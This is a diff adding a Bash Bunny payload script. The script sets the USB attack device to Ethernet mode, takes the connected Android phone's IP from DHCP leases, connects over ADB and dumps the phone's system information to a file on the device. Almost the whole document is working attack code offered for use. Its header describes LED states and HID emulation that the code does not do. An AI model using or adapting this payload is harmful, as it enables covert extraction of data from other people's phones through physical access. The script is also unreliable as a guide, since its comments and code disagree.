@@ -1,0 +1,46 @@
+# Title:         adb shell dumpsys
+# Author:        D14b0l1c
+#
+# Description:
+# Set the Bash Bunny to ECM Ethernet attack mode
+# Extract the IP address of the connected device from DHCP leases
+# Connect to the device using ADB over TCP/IP and save the output to a log file
+# Dump system information from the device and save it to a file
+# Indicate that the payload has finished executing
+#
+# LED States:
+# - Purple: Running HID emulation, connecting to the Android device
+# - Blue Blinking: Running the 'adb shell dumpsys' command
+# - Red Blinking: Failed to connect to the Android device
+# - Green: Finished
+
+# Set the Bash Bunny to ECM Ethernet attack mode
+ATTACKMODE ECM_ETHERNET 
+
+# Wait for 5 seconds to ensure the network interface is ready
+sleep 5
+
+# Extract the IP address of the connected device from DHCP leases
+TARGET_IP=$(cat /var/lib/dhcp/dhcpd.leases | grep ^lease | awk '{ print $2 }' | sort | uniq)
+
+# Save the obtained IP address to a log file
+cat /var/lib/dhcp/dhcpd.leases | grep ^lease | awk '{ print $2 }' | sort | uniq > /root/logs.txt
+
+# Connect to the device using ADB over TCP/IP and save the output to a log file
+adb connect ${TARGET_IP}
+adb connect ${TARGET_IP} > /root/logs.txt
+
+# Wait for 20 seconds (optional)
+sleep 20
+
+# Dump system information from the device and save it to a file
+adb shell dumpsys > /root/dumpsys.txt
+
+# Wait for 10 seconds (optional)
+sleep 10
+
+# Set the Bash Bunny back to ECM Ethernet attack mode
+ATTACKMODE ECM_ETHERNET 
+
+# Indicate that the payload has finished executing
+LED FINISH
